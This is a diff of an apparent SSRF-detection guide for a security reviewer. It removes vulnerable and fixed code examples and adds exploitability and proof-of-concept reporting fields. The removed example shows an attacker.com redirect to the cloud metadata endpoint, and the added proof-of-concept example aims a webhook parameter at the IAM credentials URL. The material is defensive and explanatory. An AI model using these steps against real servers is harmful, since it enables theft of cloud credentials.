-    if parsed.scheme not in ALLOWED_SCHEMES:
-        raise ValueError(f"Scheme not allowed: {parsed.scheme}")
-    # Resolve hostname to IP and check against blocked ranges
-    resolved = socket.getaddrinfo(parsed.hostname, parsed.port or 443)
-    ip = ipaddress.ip_address(resolved[0][4][0])
-    for blocked in BLOCKED_RANGES:
-        if ip in blocked:
-            raise ValueError(f"Internal IP blocked: {ip}")
-    return url
-
-@app.route("/api/preview")
-def link_preview():
-    url = request.args.get("url")
-    validated = validate_url(url)
-    response = http_client.get(validated, allow_redirects=False, timeout=5)
-    return {"status": response.status_code, "body": response.text[:1000]}
 ```
 
-### Example 2: SSRF via Redirect Following (Vulnerable)
+### `exploitability` — map from impact:
 
-**Vulnerable pattern:**
-```javascript
-const express = require('express');
-const axios = require('axios');
-const { URL } = require('url');
+| Worst-case impact | `exploitability` value |
+|---|---|
+| Credential exfiltration via cloud metadata (IMDSv1) | `"high"` |
+| Full-read SSRF (response body returned to attacker) | `"high"` |
+| Blind SSRF with internal service side effects | `"medium"` |
+| Port scanning / service discovery only | `"low"` |
+| Cannot determine | `"none"` |
 
-const app = express();
+### `proof_of_concept` — the attack path:
 
-const BLOCKED_HOSTS = ['localhost', '127.0.0.1', '169.254.169.254', '0.0.0.0'];
-
-app.get('/fetch', async (req, res) => {
-    const targetUrl = req.query.url;
-    const parsed = new URL(targetUrl);
-
-    // Check: block requests to internal hosts
-    if (BLOCKED_HOSTS.includes(parsed.hostname)) {
-        return res.status(403).json({ error: 'Blocked host' });
-    }
-
-    // BUG: axios follows redirects by default (up to 5)
-    const response = await axios.get(targetUrl);
-    res.json({ data: response.data });
-});
-```
-
-**Why vulnerable:** The blocklist check runs against the initial URL, but `axios` follows redirects by default. An attacker hosts a redirect on their server:
-```
-https://attacker.com/redirect → 302 Location: http://169.254.169.254/latest/meta-data/
-```
-The initial URL `https://attacker.com/redirect` passes the blocklist check (hostname is `attacker.com`). Axios then follows the 302 redirect to the cloud metadata endpoint, bypassing the defense entirely.
-
-**Impact:** Cloud metadata access through redirect bypass. Attacker obtains IAM credentials despite the blocklist.
-
-**Fix:**
-```javascript
-app.get('/fetch', async (req, res) => {
-    const targetUrl = req.query.url;
-
-    // Option 1: Disable redirects entirely
-    try {
-        const response = await axios.get(targetUrl, {
-            maxRedirects: 0,
-            validateStatus: (status) => status < 400,
-        });
-        res.json({ data: response.data });
-    } catch (err) {
-        if (err.response && [301, 302, 307, 308].includes(err.response.status)) {
-            return res.status(403).json({ error: 'Redirects not allowed' });
-        }
-        throw err;
-    }
-
-    // Option 2: Validate each redirect destination (if redirects are needed)
-    // Use axios interceptors to check every redirect URL against blocklist
-});
-```
-
-### Example 3: False Positive — URL from Allowlisted Configuration
-
-```python
-import requests
-from config import PAYMENT_GATEWAY_URL  # "https://api.stripe.com/v1"
-
-def charge_customer(token: str, amount: int):
-    # URL is hardcoded in server config — not user-controlled
-    response = requests.post(
-        f"{PAYMENT_GATEWAY_URL}/charges",
-        headers={"Authorization": f"Bearer {STRIPE_SECRET}"},
-        json={"source": token, "amount": amount, "currency": "usd"},
-    )
-    return response.json()
-```
-
-**Why safe:** The URL base (`PAYMENT_GATEWAY_URL`) comes from a server-side configuration file, not from user input. The user controls the `token` and `amount` parameters, but these are sent as POST body JSON — they do not influence where the request is sent. The path `/charges` is hardcoded. Even if the config value were changed, it would require server-side file access, which is a different (and higher-privilege) attack class.
-
-**Key distinction:** SSRF requires user control over the *destination* of the request (URL, host, or scheme), not just the *data* sent in the request body or headers.
-
-## Common False Positive Patterns
-
-1. **Hardcoded URLs with user data in body/headers**: Server calls a fixed API endpoint and sends user input as payload — the destination is not user-controlled. Example: `requests.post("https://api.example.com/notify", json={"message": user_input})`
-
-2. **URL constructed from server-side database lookups with internal IDs**: `url = config.services[service_id]` where `service_id` is an integer index into a fixed configuration map, not an arbitrary user string
-
-3. **Outbound webhooks validated by ownership verification**: Systems like Slack or Stripe verify webhook URLs via a challenge-response handshake before sending data, reducing (but not eliminating) SSRF risk
-
-4. **Image/file uploads processed locally**: The server receives an uploaded file and processes it locally (resize, convert). No outbound request is made. Contrast with "fetch from URL" which IS SSRF-relevant
-
-5. **DNS resolution in logging/monitoring**: Server resolves a hostname for logging purposes (`socket.getfqdn()`) but does not make an HTTP request to the resolved address — no meaningful SSRF impact
-
-6. **Static asset fetching at build time**: Build scripts or deployment pipelines that `curl` fixed URLs to download dependencies. These run at build time, not at request time, and the URLs are in version-controlled config files
-
-7. **OAuth/SSO redirect validation**: Server validates `redirect_uri` against a registered allowlist before redirecting the user's browser. This is a client-side redirect (the user's browser follows it), not a server-side request — it is an open redirect concern, not SSRF
+State the concrete sequence that triggers SSRF. Example:
+`"Submit webhook_url parameter with value 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' via POST /api/settings. Server calls requests.get(webhook_url) with follow_redirects=True. No IP validation or allowlist. Server is on AWS EC2 with IMDSv1 enabled — returns IAM credentials in response body visible to attacker."`
